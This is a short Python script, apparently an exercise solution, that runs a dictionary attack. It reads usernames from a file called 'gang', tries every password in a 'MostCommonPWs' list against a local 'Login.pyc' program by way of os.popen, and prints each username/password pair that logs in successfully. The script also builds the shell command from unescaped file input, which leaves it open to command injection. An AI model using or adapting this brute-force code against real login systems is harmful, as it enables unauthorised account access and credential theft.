import hashlib
import os
from datetime import datetime

def findPass():
    start = datetime.now()
    gang = open("gang", "r")
    for member in gang:
        passwords = open("./MostCommonPWs", "r")
        for line in passwords:
            res = os.popen("python3 Login.pyc {} {}".format(member.strip(), line)).read()

            if res.strip() == "Login successful.":
                print(member.strip(), line.strip())

    end = datetime.now()
    print("Start time: {}".format(start.strftime("%H:%M:%S")))
    print("End time: {}".format(end.strftime("%H:%M:%S")))

findPass()
